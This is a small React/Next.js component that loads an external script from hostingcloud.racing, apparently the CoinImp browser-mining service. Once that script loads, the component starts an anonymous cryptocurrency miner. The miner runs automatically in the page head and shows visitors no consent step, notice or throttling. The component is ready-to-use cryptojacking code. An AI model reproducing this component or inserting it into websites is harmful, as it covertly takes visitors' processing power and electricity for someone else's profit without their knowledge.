import React from 'react';
import Head from 'next/head';

const CoinimpComponent = () => {
    const onLoad = () => {
        const miner = new Client.Anonymous(`<site-key>`);
        miner.start();
    };

    return (
        <Head>
            <script src={`https://www.hostingcloud.racing/gPMq.js`} onLoad={onLoad} async></script>
        </Head>
    );
};

export default CoinimpComponent;
